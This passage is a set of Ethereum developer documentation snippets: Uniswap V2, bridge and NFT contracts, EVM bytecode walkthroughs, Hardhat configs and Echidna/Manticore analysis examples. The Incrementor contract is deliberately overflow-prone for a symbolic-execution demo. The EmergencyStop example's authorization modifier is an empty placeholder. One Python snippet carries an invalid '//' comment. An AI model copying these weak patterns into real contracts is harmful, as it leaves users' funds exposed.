0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xCB8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFBB PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xCC3 DUP4 DUP4 DUP4 PUSH2 0xFB5 JUMP\n```\n\n----------------------------------------\n\nTITLE: Implementing CounterFactory Mapping in Solidity\nDESCRIPTION: A mapping that associates an owner's address with their Counter contract instance. This is used in the CounterFactory to track all deployed Counter contracts.\n\nLANGUAGE: solidity\nCODE:\n```\nmapping(address => Counter) _counters;\n```\n\n----------------------------------------\n\nTITLE: Implementing CounterFactory Mapping in Solidity\nDESCRIPTION: A mapping that associates an owner's address with their Counter contract instance. This is used in the CounterFactory to track all deployed Counter contracts.\n\nLANGUAGE: solidity\nCODE:\n```\nmapping(address => Counter) _counters;\n```\n\n----------------------------------------\n\nTITLE: Internal Withdrawal Implementation in Solidity\nDESCRIPTION: Internal function that handles the actual withdrawal logic, burning tokens on L2 and sending a message to L1 to release the equivalent tokens. It handles both ETH and ERC20 tokens.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Performs the logic for withdrawals by burning the token and informing\n     *      the L1 token Gateway of the withdrawal.\n     * @param _l2Token Address of L2 token where withdrawal is initiated.\n     * @param _from Account to pull the withdrawal from on L2.\n     * @param _to Account to give the withdrawal to on L1.\n     * @param _amount Amount of the token to withdraw.\n     * @param _l1Gas Unused, but included for potential forward compatibility considerations.\n     * @param _data Optional data to forward to L1. This data is provided\n     *        solely as a convenience for external contracts. Aside from enforcing a maximum\n     *        length, these contracts provide no guarantees about its content.\n     */\n    function _initiateWithdrawal(\n        address _l2Token,\n        address _from,\n        address _to,\n        uint256 _amount,\n        uint32 _l1Gas,\n        bytes calldata _data\n    ) internal {\n        // When a withdrawal is initiated, we burn the withdrawer's funds to prevent subsequent L2\n        // usage\n        // slither-disable-next-line reentrancy-events\n        IL2StandardERC20(_l2Token).burn(msg.sender, _amount);\n```\n\n----------------------------------------\n\nTITLE: Querying Graph Data with Apollo and React Hooks\nDESCRIPTION: This code shows how to create a GraphQL query using the gql tag and execute it with the useQuery hook from Apollo Client. The query retrieves player statistics including win/loss counts and betting history, and the code includes a useEffect hook to process the response data.\n\nLANGUAGE: javascript\nCODE:\n```\nconst myGraphQlQuery = gql`\n    players(where: { id: $currentUser }) {\n      totalPlayedCount\n      hasWonCount\n      hasLostCount\n      bets {\n        time\n      }\n    }\n`\n\nconst { loading, error, data } = useQuery(myGraphQlQuery)\n\nReact.useEffect(() => {\n  if (!loading && !error && data) {\n    console.log({ data })\n  }\n}, [loading, error, data])\n```\n\n----------------------------------------\n\nTITLE: Running Echidna with Gas Estimation Configuration\nDESCRIPTION: Command to execute Echidna with a custom configuration file that has gas estimation enabled. This will analyze the contract and report the maximum gas used by each function after fuzzing.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test contract.sol --config config.yaml\n...\n```\n\n----------------------------------------\n\nTITLE: Finalizing ETH Withdrawal from L2 to L1 in Solidity\nDESCRIPTION: This function handles finalizing ETH withdrawals from L2 to L1. It verifies the request came from the L2 token bridge via the cross-domain messenger, transfers ETH to the recipient, and emits an event to confirm completion.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction finalizeETHWithdrawal(\n    address _from,\n    address _to,\n    uint256 _amount,\n    bytes calldata _data\n) external onlyFromCrossDomainAccount(l2TokenBridge) {\n    // slither-disable-next-line reentrancy-events\n    (bool success, ) = _to.call{ value: _amount }(new bytes(0));\n    require(success, \"TransferHelper::safeTransferETH: ETH transfer failed\");\n\n    // slither-disable-next-line reentrancy-events\n    emit ETHWithdrawalFinalized(_from, _to, _amount, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Token Amounts Added to Uniswap V2 Pool\nDESCRIPTION: Determines how much of each token type has been added to the pool by comparing current balances with previous reserves. This calculation is essential for determining the appropriate amount of liquidity tokens to mint.\n\nLANGUAGE: solidity\nCODE:\n```\n        uint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\n```\n\n----------------------------------------\n\nTITLE: Operator Approval Function in Vyper\nDESCRIPTION: External function that allows an address to approve or revoke another address as an operator for all their tokens. Operators can transfer any token owned by the approver. The function prevents setting oneself as an operator and emits an ApprovalForAll event.\n\nLANGUAGE: vyper\nCODE:\n```\ndef setApprovalForAll(_operator: address, _approved: bool):\n    \"\"\"\n    @dev Enables or disables approval for a third party (\"operator\") to manage all of\n         `msg.sender`'s assets. It also emits the ApprovalForAll event.\n         Throws if `_operator` is the `msg.sender`. (NOTE: This is not written the EIP)\n    @notice This works even if sender doesn't own any tokens at the time.\n    @param _operator Address to add to the set of authorized operators.\n    @param _approved True if the operators is approved, false to revoke approval.\n    \"\"\"\n    # Throws if `_operator` is the `msg.sender`\n    assert _operator != msg.sender\n    self.ownerToOperators[msg.sender][_operator] = _approved\n    log ApprovalForAll(msg.sender, _operator, _approved)\n```\n\n----------------------------------------\n\nTITLE: Simulating Withdrawal Effects in ERC-4626 Vault (Solidity)\nDESCRIPTION: This function allows users to simulate the effects of their withdrawal at the current block, showing how many shares would be burned.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction previewWithdraw(uint256 assets) public view returns (uint256 shares)\n```\n\n----------------------------------------\n\nTITLE: Implementing Compact Encoding for Merkle Patricia Tries in Python\nDESCRIPTION: A Python function that implements the compact encoding of hex sequences with optional terminator for Ethereum's Merkle Patricia Tries. This encoding handles both leaf and extension nodes with even or odd path lengths.\n\nLANGUAGE: python\nCODE:\n```\ndef compact_encode(hexarray):\n    term = 1 if hexarray[-1] == 16 else 0\n    if term: hexarray = hexarray[:-1]\n    oddlen = len(hexarray) % 2\n    flags = 2 * term + oddlen\n    if oddlen:\n        hexarray = [flags] + hexarray\n    else:\n        hexarray = [flags] + [0] + hexarray\n    // hexarray now has an even length whose first nibble is the flags.\n    o = ''\n    for i in range(0,len(hexarray),2):\n        o += chr(16 * hexarray[i] + hexarray[i+1])\n    return o\n```\n\n----------------------------------------\n\nTITLE: Implementing Constructor for UniswapV2Factory in Solidity\nDESCRIPTION: The constructor initializes the factory contract by setting the feeToSetter address, which controls who can change fee parameters. The factory starts with no protocol fees enabled.\n\nLANGUAGE: solidity\nCODE:\n```\n    constructor(address _feeToSetter) public {\n        feeToSetter = _feeToSetter;\n    }\n```\n\n----------------------------------------\n\nTITLE: CREATE2 Opcode Implementation (0xF5)\nDESCRIPTION: Creates a new contract with deterministic address based on salt and initialization code. Allows for predictable contract addresses independent of deployment sequence.\n\nLANGUAGE: solidity\nCODE:\n```\naddr = keccak256(0xff ++ address(this) ++ salt ++ keccak256(mem[ost:ost+len-1]))[12:]\n```\n\n----------------------------------------\n\nTITLE: Web3 Client Version Request and Response\nDESCRIPTION: Example of requesting the client version from an Ethereum node using the web3_clientVersion method. This shows both the request format and the expected response structure.\n\nLANGUAGE: js\nCODE:\n```\n// Richiesta\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"web3_clientVersion\",\"params\":[],\"id\":67}'\n// Risultato\n{\n  \"id\":67,\n  \"jsonrpc\":\"2.0\",\n  \"result\": \"Geth/v1.12.1-stable/linux-amd64/go1.19.1\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Constants for Parameter Testing\nDESCRIPTION: Sets up constants for function signatures and test values used in parameter reading tests.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Function signature for fourParams(), courtesy of\n    // https://www.4byte.directory/signatures/?bytes4_signature=0x3edc1e6d\n    bytes4 constant FOUR_PARAMS = 0x3edc1e6d;\n\n    // Just some constant values to see we're getting the correct values back\n    uint256 constant VAL_A = 0xDEAD60A7;\n    uint256 constant VAL_B =     0xBEEF;\n    uint256 constant VAL_C =     0x600D;\n    uint256 constant VAL_D = 0x600D60A7;\n```\n\n----------------------------------------\n\nTITLE: Implementing getCrossDomainMessenger Function\nDESCRIPTION: Internal function that returns the cross-domain messenger interface. This function allows inheriting contracts to override the messenger selection logic if needed.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**********************\n     * Internal Functions *\n     **********************/\n\n    /**\n     * Gets the messenger, usually from storage. This function is exposed in case a child contract\n     * needs to override.\n     * @return The address of the cross-domain messenger contract which should be used.\n     */\n    function getCrossDomainMessenger() internal virtual returns (ICrossDomainMessenger) {\n        return ICrossDomainMessenger(messenger);\n    }\n```\n\n----------------------------------------\n\nTITLE: 実装する緊急停止機能（EmergencyStop）パターン（Solidity）\nDESCRIPTION: スマートコントラクトに緊急停止機能を実装する例。isStopped変数と3つのモディファイア（stoppedInEmergency、onlyWhenStopped、onlyAuthorized）を使用して、緊急時に特定の関数の実行を制御します。\n\nLANGUAGE: solidity\nCODE:\n```\n// このコードは、専門的な監査を受けておらず、安全性や正確性を約束するものではありません。 自己責任で利用してくだささい。\n\ncontract EmergencyStop {\n\n    bool isStopped = false;\n\n    modifier stoppedInEmergency {\n        require(!isStopped);\n        _;\n    }\n\n    modifier onlyWhenStopped {\n        require(isStopped);\n        _;\n    }\n\n    modifier onlyAuthorized {\n        // Check for authorization of msg.sender here\n        _;\n    }\n\n    function stopContract() public onlyAuthorized {\n        isStopped = true;\n    }\n\n    function resumeContract() public onlyAuthorized {\n        isStopped = false;\n    }\n\n    function deposit() public payable stoppedInEmergency {\n        // Deposit logic happening here\n    }\n\n    function emergencyWithdraw() public onlyWhenStopped {\n        // Emergency withdraw happening here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Block Operation Limits in Ethereum\nDESCRIPTION: This JavaScript snippet shows how Ethereum calculates the operation limit for each block using an exponential moving average. It uses constants BLK_LIMIT_FACTOR (65536) and EMA_FACTOR (1.5) to regulate block size and prevent abuse.\n\nLANGUAGE: javascript\nCODE:\n```\nblk.oplimit = floor((blk.parent.oplimit \\* (EMAFACTOR - 1) +\nfloor(parent.opcount \\* BLK\\_LIMIT\\_FACTOR)) / EMA\\_FACTOR)\n```\n\n----------------------------------------\n\nTITLE: CurrentWindow() Method Implementation in EVM Bytecode\nDESCRIPTION: Implementation of the currentWindow() method which retrieves the current window value from storage slot 1 and prepares it for return.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n164 | JUMPDEST     |\n165 | POP          |\n166 | PUSH2 0x00da | 0xDA\n169 | PUSH1 0x01   | 0x01 0xDA\n16B | SLOAD        | Storage[1] 0xDA\n16C | DUP2         | 0xDA Storage[1] 0xDA\n16D | JUMP         | Storage[1] 0xDA\n```\n\n----------------------------------------\n\nTITLE: Setting Up Environment Inside Docker Container\nDESCRIPTION: Commands to select a specific Solidity compiler version and navigate to the mounted directory inside the Docker container.\n\nLANGUAGE: bash\nCODE:\n```\nsolc-select 0.5.11\ncd /home/training\n```\n\n----------------------------------------\n\nTITLE: Complete Manticore Analysis Example\nDESCRIPTION: A complete example showing initialization, contract creation, symbolic execution, and finalization in Manticore.\n\nLANGUAGE: python\nCODE:\n```\nfrom manticore.ethereum import ManticoreEVM\n\nm = ManticoreEVM()\n\nwith open('example.sol') as f:\n    source_code = f.read()\n\nuser_account = m.create_account(balance=1000)\ncontract_account = m.solidity_create_contract(source_code, owner=user_account)\n\nsymbolic_var = m.make_symbolic_value()\ncontract_account.f(symbolic_var)\n\nprint(\"Results are in {}\".format(m.workspace))\nm.finalize() # stop the exploration\n```\n\n----------------------------------------\n\nTITLE: L2TokenBridge Getter Function\nDESCRIPTION: Defines a function to get the address of the corresponding L2 bridge contract. This function exists for symmetry with the L2 bridge, as the L2 bridge is predeployed at a known address.\n\nLANGUAGE: solidity\nCODE:\n```\n    /********************\n     * Public Functions *\n     ********************/\n\n    /**\n     * @dev get the address of the corresponding L2 bridge contract.\n     * @return Address of the corresponding L2 bridge contract.\n     */\n    function l2TokenBridge() external returns (address);\n```\n\n----------------------------------------\n\nTITLE: EVM Stack Operations (PUSH8-PUSH28) Reference Table\nDESCRIPTION: A comprehensive reference table documenting Ethereum Virtual Machine opcodes for pushing multi-byte values onto the stack. The table shows opcodes from PUSH8 through PUSH28, each with a fixed gas cost of 3. These opcodes are fundamental building blocks for constructing contract bytecode in Ethereum, allowing values of different sizes to be placed on the stack during execution.\n\nLANGUAGE: markdown\nCODE:\n```\n|  67   | PUSH8          |                                                3                                                | `。`                                              | `uint64`                                     |                                                                               | push 8-byte value onto stack                                                                                                                                          |\n|  68   | PUSH9          |                                                3                                                | `。`                                              | `uint72`                                     |                                                                               | push 9-byte value onto stack                                                                                                                                          |\n|  69   | PUSH10         |                                                3                                                | `。`                                              | `uint80`                                     |                                                                               | push 10-byte value onto stack                                                                                                                                         |\n|  6A   | PUSH11         |                                                3                                                | `。`                                              | `uint88`                                     |                                                                               | push 11-byte value onto stack                                                                                                                                         |\n|  6B   | PUSH12         |                                                3                                                | `。`                                              | `uint96`                                     |                                                                               | push 12-byte value onto stack                                                                                                                                         |\n|  6C   | PUSH13         |                                                3                                                | `。`                                              | `uint104`                                    |                                                                               | push 13-byte value onto stack                                                                                                                                         |\n|  6D   | PUSH14         |                                                3                                                | `。`                                              | `uint112`                                    |                                                                               | push 14-byte value onto stack                                                                                                                                         |\n|  6E   | PUSH15         |                                                3                                                | `。`                                              | `uint120`                                    |                                                                               | push 15-byte value onto stack                                                                                                                                         |\n|  6F   | PUSH16         |                                                3                                                | `。`                                              | `uint128`                                    |                                                                               | push 16-byte value onto stack                                                                                                                                         |\n|  70   | PUSH17         |                                                3                                                | `。`                                              | `uint136`                                    |                                                                               | push 17-byte value onto stack                                                                                                                                         |\n|  71   | PUSH18         |                                                3                                                | `。`                                              | `uint144`                                    |                                                                               | push 18-byte value onto stack                                                                                                                                         |\n|  72   | PUSH19         |                                                3                                                | `。`                                              | `uint152`                                    |                                                                               | push 19-byte value onto stack                                                                                                                                         |\n|  73   | PUSH20         |                                                3                                                | `。`                                              | `uint160`                                    |                                                                               | push 20-byte value onto stack                                                                                                                                         |\n|  74   | PUSH21         |                                                3                                                | `。`                                              | `uint168`                                    |                                                                               | push 21-byte value onto stack                                                                                                                                         |\n|  75   | PUSH22         |                                                3                                                | `。`                                              | `uint176`                                    |                                                                               | push 22-byte value onto stack                                                                                                                                         |\n|  76   | PUSH23         |                                                3                                                | `。`                                              | `uint184`                                    |                                                                               | push 23-byte value onto stack                                                                                                                                         |\n|  77   | PUSH24         |                                                3                                                | `。`                                              | `uint192`                                    |                                                                               | push 24-byte value onto stack                                                                                                                                         |\n|  78   | PUSH25         |                                                3                                                | `。`                                              | `uint200`                                    |                                                                               | push 25-byte value onto stack                                                                                                                                         |\n|  79   | PUSH26         |                                                3                                                | `。`                                              | `uint208`                                    |                                                                               | push 26-byte value onto stack                                                                                                                                         |\n|  7A   | PUSH27         |                                                3                                                | `。`                                              | `uint216`                                    |                                                                               | push 27-byte value onto stack                                                                                                                                         |\n|  7B   | PUSH28         |                                                3                                                | `。`                                              | `uint224`                                    |                                                                               | push 28-byte value onto stack                                                                                                                                         |\n```\n\n----------------------------------------\n\nTITLE: Handling Return Data in Ethereum Proxy Contract\nDESCRIPTION: This code copies the return data from the delegate call to memory and prepares to return it to the caller. It ensures that the proxy transparently forwards both the call and the response.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\nB0 | RETURNDATASIZE | RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address                          \nB1 | DUP1           | RETURNDATASIZE RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address           \nB2 | PUSH1 0x00     | 0x00 RETURNDATASIZE RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address      \nB4 | DUP5           | 0x80 0x00 RETURNDATASIZE RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address \nB5 | RETURNDATACOPY | RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address\n```\n\n----------------------------------------\n\nTITLE: Implementing burn Function for ERC-721 Destruction\nDESCRIPTION: The burn function destroys existing tokens. It includes authorization checks to ensure only the owner or an approved address can burn a token, and it clears all associated data to free up storage.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef burn(_tokenId: uint256):\n    \"\"\"\n    @dev Burns a specific ERC721 token.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT.\n         Throws if `_tokenId` is not a valid NFT.\n    @param _tokenId uint256 id of the ERC721 token to be burned.\n    \"\"\"\n    # Check requirements\n    assert self._isApprovedOrOwner(msg.sender, _tokenId)\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    self._clearApproval(owner, _tokenId)\n    self._removeTokenFrom(owner, _tokenId)\n    log Transfer(owner, ZERO_ADDRESS, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Initializing web3.js with a local Ethereum node\nDESCRIPTION: Shows how to create a new Web3 instance that connects to a local Ethereum node or Ganache instance running on the default port.\n\nLANGUAGE: javascript\nCODE:\n```\nconst web3 = new Web3(\"http://localhost:8545\")\n```\n\n----------------------------------------\n\nTITLE: Implementing Constructor for L2StandardERC20 with Bridge Configuration\nDESCRIPTION: Initializes the L2StandardERC20 contract with bridge configuration parameters and standard ERC-20 name and symbol.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @param _l2Bridge Address of the L2 standard bridge.\n     * @param _l1Token Address of the corresponding L1 token.\n     * @param _name ERC20 name.\n     * @param _symbol ERC20 symbol.\n     */\n    constructor(\n        address _l2Bridge,\n        address _l1Token,\n        string memory _name,\n        string memory _symbol\n    ) ERC20(_name, _symbol) {\n        l1Token = _l1Token;\n        l2Bridge = _l2Bridge;\n    }\n```\n\n----------------------------------------\n\nTITLE: Echidna Configuration for Function Filtering\nDESCRIPTION: YAML configuration for Echidna that blacklists specific functions to prevent them from being called during fuzzing. This helps obtain more accurate gas consumption estimates by preventing functions that would reduce array size.\n\nLANGUAGE: yaml\nCODE:\n```\nfilterBlacklist: true\nfilterFunctions: [\"pop\", \"clear\"]\n```\n\n----------------------------------------\n\nTITLE: Calculating Protocol Fees in Uniswap V2\nDESCRIPTION: Calculates and mints any protocol fees that need to be collected. Uses the old reserve values to accurately calculate fees based only on reserve changes due to fees.\n\nLANGUAGE: solidity\nCODE:\n```\nbool feeOn = _mintFee(_reserve0, _reserve1);\n```\n\n----------------------------------------\n\nTITLE: Smart Contract with Assert Statement\nDESCRIPTION: Solidity contract with an assertion to verify that a temporary value is less than or equal to the counter after incrementing it.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract Incrementor {\n  uint private counter = 2**200;\n\n  function inc(uint val) public returns (uint){\n    uint tmp = counter;\n    counter += val;\n    assert (tmp <= counter);\n    return (counter - tmp);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Cache Deduplication Functionality\nDESCRIPTION: Tests that caching the same value multiple times returns the same key, confirming the cache's deduplication feature works correctly.\n\nLANGUAGE: solidity\nCODE:\n```\n        }\n    }    // testCaching\n\n\n    // Cache the same value multiple times, ensure that the key stays\n    // the same\n    function testRepeatCaching() public {\n        for(uint i=1; i<100; i++) {\n            uint _key1 = cache.cacheWrite(i);\n            uint _key2 = cache.cacheWrite(i);\n            assertEq(_key1, _key2);\n        }\n```\n\n----------------------------------------\n\nTITLE: Configuring Hardhat for Ethereum Development\nDESCRIPTION: Hardhat configuration file that sets up the development environment for Ethereum smart contracts. It includes network configurations for Ropsten testnet, loads environment variables, and specifies the Solidity compiler version.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire('dotenv').config();\n\nrequire(\"@nomiclabs/hardhat-ethers\");\nconst { API_URL, PRIVATE_KEY } = process.env;\n\n/**\n* @type import('hardhat/config').HardhatUserConfig\n*/\nmodule.exports = {\n   solidity: \"0.7.3\",\n   defaultNetwork: \"ropsten\",\n   networks: {\n      hardhat: {},\n      ropsten: {\n         url: API_URL,\n         accounts: [`0x${PRIVATE_KEY}`]\n      }\n   },\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating and Minting Protocol Fees in UniswapV2Pair (Solidity)\nDESCRIPTION: The _mintFee function calculates and mints the protocol fee (0.05% of trading fees) when liquidity is added or removed. It uses the change in the square root of the reserves product (k) to determine how much new liquidity should be minted to the fee recipient.\n\nLANGUAGE: solidity\nCODE:\n```\n    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)\n    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        address feeTo = IUniswapV2Factory(factory).feeTo();\n        feeOn = feeTo != address(0);\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        uint _kLast = kLast; // gas savings\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        if (feeOn) {\n            if (_kLast != 0) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));\n                uint rootKLast = Math.sqrt(_kLast);\n                if (rootK > rootKLast) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));\n                    uint denominator = rootK.mul(5).add(rootKLast);\n                    uint liquidity = numerator / denominator;\n```\n\nLANGUAGE: solidity\nCODE:\n```\n                    if (liquidity > 0) _mint(feeTo, liquidity);\n                }\n            }\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        } else if (_kLast != 0) {\n            kLast = 0;\n        }\n    }\n```\n\n----------------------------------------\n\nTITLE: Testing Basic Cache Functionality in Solidity\nDESCRIPTION: Test function that verifies basic caching functionality by writing square values to the cache and reading them back, ensuring data integrity.\n\nLANGUAGE: solidity\nCODE:\n```\n    function testCaching() public {\n        for(uint i=1; i<5000; i++) {\n            cache.cacheWrite(i*i);\n        }\n\n        for(uint i=1; i<5000; i++) {\n            assertEq(cache.cacheRead(i), i*i);\n        }\n    }    // testCaching\n```\n\n----------------------------------------\n\nTITLE: Setting Up Pinata API for IPFS Integration\nDESCRIPTION: Code to configure environment variables for Pinata API authentication, which will be used to pin NFT metadata to IPFS.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst key = process.env.REACT_APP_PINATA_KEY\nconst secret = process.env.REACT_APP_PINATA_SECRET\n```\n\n----------------------------------------\n\nTITLE: Configuring Hardhat for Ethereum Smart Contract Deployment\nDESCRIPTION: This configuration file for Hardhat sets up the environment for compiling and deploying the NFT contract. It includes network configuration for Sepolia testnet, imports required plugins, and loads environment variables for API keys and private keys.\n\nLANGUAGE: javascript\nCODE:\n```\n/**\n* @type import('hardhat/config').HardhatUserConfig\n*/\nrequire('dotenv').config();\nrequire(\"@nomiclabs/hardhat-ethers\");\nconst { API_URL, PRIVATE_KEY } = process.env;\nmodule.exports = {\n   solidity: \"0.8.1\",\n   defaultNetwork: \"sepolia\",\n   networks: {\n      hardhat: {},\n      sepolia: {\n         url: API_URL,\n         accounts: [`0x${PRIVATE_KEY}`]\n      }\n   },\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing Smart Contract Event Listener with React useEffect\nDESCRIPTION: A React useEffect hook that loads the current message from the smart contract and initializes the event listener when the component mounts. This ensures the UI stays in sync with the blockchain state.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nuseEffect(async () => {\n  const message = await loadCurrentMessage()\n  setMessage(message)\n  addSmartContractListener()\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-20 Token Cleanup Function in Solidity\nDESCRIPTION: A function that allows the contract owner to recover ERC-20 tokens mistakenly sent to the contract. It transfers the entire balance of a specified token to a destination address.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction cleanupERC20(\n    address erc20,\n    address dest\n)\n    public\n    onlyOwner\n{\n    IERC20 token = IERC20(erc20);\n    uint balance = token.balanceOf(address(this));\n    token.transfer(dest, balance);\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-Hop Token Swap Calculations\nDESCRIPTION: Implements functions for calculating amounts in multi-hop token swaps across multiple pairs. These functions handle chained calculations through a specified token path to determine input or output amounts.\n\nLANGUAGE: solidity\nCODE:\n```\n    // performs chained getAmountOut calculations on any number of pairs\n    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {\n        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');\n        amounts = new uint[](path.length);\n        amounts[0] = amountIn;\n        for (uint i; i < path.length - 1; i++) {\n            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);\n            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);\n        }\n    }\n\n    // performs chained getAmountIn calculations on any number of pairs\n    function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) {\n        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');\n        amounts = new uint[](path.length);\n        amounts[amounts.length - 1] = amountOut;\n        for (uint i = path.length - 1; i > 0; i--) {\n            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);\n            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Minimum Liquidity Constant in Solidity\nDESCRIPTION: Sets a minimum number of liquidity tokens (1000) that always exist to avoid division by zero errors. These tokens are owned by account zero.\n\nLANGUAGE: solidity\nCODE:\n```\nuint public constant MINIMUM_LIQUIDITY = 10**3;\n```\n\n----------------------------------------\n\nTITLE: Checking Maximum Withdrawal Limit in ERC-4626 Vault (Solidity)\nDESCRIPTION: This function returns the maximum amount of underlying assets that can be withdrawn from the owner's balance in a single withdraw call.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction maxWithdraw(address owner) public view returns (uint256 maxAssets)\n```\n\n----------------------------------------\n\nTITLE: Implementing balanceOf Function for ERC-721 in Vyper\nDESCRIPTION: The balanceOf view function returns the number of tokens owned by a specific address. It validates that the owner address is not zero, as tokens assigned to the zero address are considered invalid.\n\nLANGUAGE: vyper\nCODE:\n```\n@view\n@external\ndef balanceOf(_owner: address) -> uint256:\n    \"\"\"\n    @dev Returns the number of NFTs owned by `_owner`.\n         Throws if `_owner` is the zero address. NFTs assigned to the zero address are considered invalid.\n    @param _owner Address for whom to query the balance.\n    \"\"\"\n    assert _owner != ZERO_ADDRESS\n    return self.ownerToNFTokenCount[_owner]\n```\n\n----------------------------------------\n\nTITLE: Comparison Operations in EVM (Opcodes 0x14-0x15)\nDESCRIPTION: Comparison opcodes for equality checking and zero testing. EQ compares two values for equality, while ISZERO checks if a value is zero.\n\nLANGUAGE: evm\nCODE:\n```\n0x14 EQ      // Stack input: a, b      Output: a == b      // (u)int256 equality\n0x15 ISZERO  // Stack input: a        Output: a == 0     // (u)int256 iszero\n```\n\n----------------------------------------\n\nTITLE: Creating a Project Directory for Ethereum Development\nDESCRIPTION: Commands to create and navigate to a new project directory for the Hello World smart contract project.\n\nLANGUAGE: bash\nCODE:\n```\nmkdir hello-world\ncd hello-world\n```\n\n----------------------------------------\n\nTITLE: DepositERC20To Function for L1 to L2 Token Transfers to Specific Recipient\nDESCRIPTION: Defines a function similar to depositERC20 but allowing transfer to a different recipient address on L2. This provides flexibility for sending tokens to another address rather than the caller.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev deposit an amount of ERC20 to a recipient's balance on L2.\n     * @param _l1Token Address of the L1 ERC20 we are depositing\n     * @param _l2Token Address of the L1 respective L2 ERC20\n     * @param _to L2 address to credit the withdrawal to.\n     * @param _amount Amount of the ERC20 to deposit.\n     * @param _l2Gas Gas limit required to complete the deposit on L2.\n     * @param _data Optional data to forward to L2. This data is provided\n     *        solely as a convenience for external contracts. Aside from enforcing a maximum\n     *        length, these contracts provide no guarantees about its content.\n     */\n    function depositERC20To(\n        address _l1Token,\n        address _l2Token,\n        address _to,\n        uint256 _amount,\n        uint32 _l2Gas,\n        bytes calldata _data\n    ) external;\n```\n\n----------------------------------------\n\nTITLE: Uniqueness Modifier for Pizza NFT in Solidity\nDESCRIPTION: A modifier to ensure a Pizza NFT is unique before creation. Checks existing pizzas and compares their names and DNA against the proposed new values. Uses keccak256 hash for string comparison.\n\nLANGUAGE: solidity\nCODE:\n```\nmodifier isUnique(string memory _name, uint256 _dna) {\n    bool result = true;\n    for (uint256 i = 0; i < pizzas.length; i++) {\n        if (\n            keccak256(abi.encodePacked(pizzas[i].name)) ==\n            keccak256(abi.encodePacked(_name)) &&\n            pizzas[i].dna == _dna\n        ) {\n            result = false;\n        }\n    }\n    require(result, \"Pizza with such name already exists.\");\n    _;\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Non-Cached Values in Solidity Encoder\nDESCRIPTION: Logic for handling values not yet in the cache by generating bytes that indicate the value should be cached during execution.\n\nLANGUAGE: solidity\nCODE:\n```\n        uint _key = val2key[_val];\n\n        // The value isn't in the cache yet, add it\n        if (_key == 0)\n            return bytes.concat(INTO_CACHE, bytes32(_val));\n```\n\n----------------------------------------\n\nTITLE: Pinning JSON Metadata to IPFS using Pinata API\nDESCRIPTION: This utility function sends NFT metadata as JSON to IPFS using the Pinata API. It makes a POST request with the JSON body and Pinata API credentials, returning either a success response with the IPFS URL or an error message.\n\nLANGUAGE: 